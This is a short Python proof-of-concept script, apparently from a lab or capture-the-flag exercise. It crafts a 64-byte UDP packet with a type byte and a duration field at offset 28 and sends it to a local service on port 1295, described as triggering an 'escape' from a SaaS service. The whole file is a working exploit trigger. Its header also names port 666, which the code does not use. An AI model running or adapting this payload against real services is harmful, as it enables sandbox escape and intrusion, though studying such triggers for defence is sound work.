## trigger_saas.py

## summary: byte sequence to trigger escape from saas service on 666

## v1.00 Start

import socket

# 1. Start with the Type (10)
# 2. Add 27 bytes of padding (to reach offset 28)
# 3. Add the Duration (0x79 == 121) as a 4-byte little-endian integer
# 4. Fill the rest to 64 bytes
payload = b"\x0a" + b"\x00"*27 + b"\x79\x00\x00\x00" + b"\x00"*32
print(f"payload:  {payload}")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(payload, ("127.0.0.1", 1295))
print("Payload sent to ALSA port 1295...")